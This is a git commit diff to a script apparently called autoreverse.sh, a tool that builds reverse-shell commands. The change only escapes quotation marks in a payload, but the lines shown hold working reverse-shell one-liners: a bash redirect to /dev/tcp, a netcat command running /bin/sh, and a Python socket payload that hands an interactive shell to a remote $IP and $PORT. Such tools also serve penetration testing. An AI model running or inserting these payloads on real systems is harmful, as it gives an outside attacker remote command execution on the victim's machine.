1725ba927c7bcea05b098fbdea48fb6491ad0f0f
CronoX1 <91015518+CronoX1@users.noreply.github.com>
2021-10-04 00:05:55 +0200

    Update autoreverse.sh

--- autoreverse.sh
+++ autoreverse.sh
@@ -24,7 +24,7 @@ bash="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
 
 nc="nc -e /bin/sh $IP $PORT"
 
-python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
 
 
 #Display of the reverse shell
